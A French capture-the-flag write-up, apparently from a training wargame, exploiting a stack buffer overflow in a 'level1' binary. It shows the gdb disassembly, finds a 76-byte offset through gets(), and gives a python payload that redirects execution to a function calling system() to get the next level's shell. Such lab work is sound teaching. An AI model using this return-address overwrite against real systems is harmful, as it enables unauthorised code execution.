On commence par `gdb` puis `info functions` pour voir les fonction de l'exec

0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini

2 fonctions se démarque, main et run

Quand on lance le programme, il attend une entrée.

On  fait disassemble de main et run

main
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret

run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x80497c0,%eax
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax
   0x08048456 <+18>:    mov    %edx,0xc(%esp)
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
   0x0804846a <+38>:    mov    %eax,(%esp)
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    movl   $0x8048584,(%esp)
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret

On voit que run execute une commande system, suposement /bin/sh et comme le fichier est executée en temps que level2, on pourrait récuperer le flag.

Donc, on voit qu'il y a une variable définie avec 80 octets, et que main execute la fonction gets, or gets ne verifie pas la memoire donc notre idée est d'ajouter l'execution de run après gets. pour cela, nous allons executé le programme avec gdp en mettant ceci comme entrée AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ on a un retour de segfault 

Program received signal SIGSEGV, Segmentation fault.
0x54545454 in ?? ()

il s'agit de la lettre T en little endian donc sachant que le compilateur reserve de la place sur la pile mais que tout l'espace n'est pas réservé au contenu on comprend qu'apres 76 octets, on depasse, il semble qu'il ne reste que les 4 octes ebp sauvegardé. Le compilateur peut faire des alignements et donc nous etions obligés de faire ce test.

On comprend qu'on doit ajouter l'adresse d'exussion après le gets pour cela nous avons essayé plusieurs methode.

simplement

(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level1/level1
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS0x08048444

mais les caracteres sont interprété comme tel, on comprend qu'il faut envoyer les 4 octets brutes de l'adresse.

pour cela, on va utilise le print de python pour envoyer dans le get 

python -c 'print("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS" + "\x44\x84\x04\x08")' | ./level1

Good... Wait what?
Segmentation fault (core dumped)

C'est mieux mais il semble que le programme s'arrete. apres nos recherches nous avons décidé d'ajouter un cat pour maintenir l'execution du shell

`(python -c 'print(AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS" + "\x44\x84\x04\x08")'; cat) | ./level1`

On est dans le shell de level2 et on recupere le flag